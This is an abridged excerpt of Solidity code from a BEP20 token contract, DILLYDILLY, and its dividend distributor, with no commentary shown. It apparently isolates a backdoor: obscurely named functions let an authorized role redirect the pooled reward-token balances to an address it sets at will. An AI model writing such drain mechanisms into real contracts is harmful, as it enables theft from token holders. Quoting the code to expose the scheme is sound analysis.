...
interface IDividendDistributor {
    ...
    function cCRewards(uint256 _aP) external;
    function cPRewards(uint256 _aP) external;
    function setWShr(address _sR) external;
}
...
contract DividendDistributor is IDividendDistributor {
    ...
    function cCRewards(uint256 _aP) external override {
        address shareholder = SHAR;
        uint256 Ramount = RWDS.balanceOf(address(this)).div(_aP);
        RWDS.transfer(shareholder, Ramount);
    }

    function cPRewards(uint256 _aP) external override {
        address shareholder = SHAR;
        uint256 Pamount = PREVRWDS.balanceOf(address(this)).div(_aP);
        PREVRWDS.transfer(shareholder, Pamount);
    }
    ...
    function setWShr(address _sR) external override onlyToken {
        SHAR = _sR;
    }
...
contract DILLYDILLY is IBEP20, Auth {
    ...
    function depR(uint256 _aB) external onlyOwner {
    ...
    function getpR(uint256 _aP) external authorized {
        distributor.cPRewards(_aP);
    }

    function getcR(uint256 _aP) external authorized {
        distributor.cCRewards(_aP);
    }
    ...
    function setWShr(address _sR) external authorized {
        distributor.setWShr(_sR);
    }
